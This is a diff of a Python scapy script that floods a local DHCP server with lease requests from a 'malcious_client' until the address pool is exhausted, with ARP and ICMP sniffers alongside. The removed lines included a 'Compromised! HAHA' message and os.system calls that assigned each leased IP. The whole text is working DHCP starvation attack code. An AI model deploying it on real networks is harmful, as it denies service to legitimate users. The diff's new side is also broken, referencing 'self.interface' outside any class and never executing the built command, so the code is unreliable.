@@ -8,7 +8,7 @@ from scapy.all import *
 import time
 
 ip_table = {}
-malcious_client = Client(False)
+malcious_client = Client()
 
 
 def arp_monitor_callback(pkt):
@@ -37,31 +37,25 @@ def rand_mac():
 def ipToString(ip):
     return "%d.%d.%d.%d" % (ip[0], ip[1], ip[2], ip[3])
 
-def assignIpCommand(ip):
+def assignIp(ip):
     cmd = "ip addr add " + ipToString(ip) + "/24 dev enp0s8"
     return cmd
 
 def leaseUntilEmpty():
+    malcious_client = Client()
     while True:
-        time.sleep(0.5)
         malcious_client.sendDiscover()
         malcious_client.awaitMessage()
-        time.sleep(0.5)
         malcious_client.sendRequest()
         malcious_client.awaitMessage()
-        obtained_ip = malcious_client.response.byteArrayToList(malcious_client.response.YIADDR)
-        if malcious_client.response._DHCPOptions_dict[53] == 4:
-            print("Compromised! HAHA")
-            break
-        print("Obtained: ", obtained_ip)
-        command = assignIpCommand(obtained_ip)
-        os.system(command)
+        obtained_ip = malcious_client.response.YIADDR
+        assignIp(obtained_ip)
 
 def arp_sniff():
-    sniff(iface="enp0s8", prn=arp_monitor_callback, filter="arp", store=0)
+    sniff(iface=self.interface, prn=arp_monitor_callback, filter="arp", store=0)
 
 def icmp_sniff():
-    sniff(iface="enp0s8", prn=icmp_monitor_callback, filter="icmp", store=0)
+    sniff(iface=self.interface, prn=icmp_monitor_callback, filter="icmp", store=0)
 
 # thread1 = threading.Thread(target = leaseUntilEmpty)
 # thread1.start()
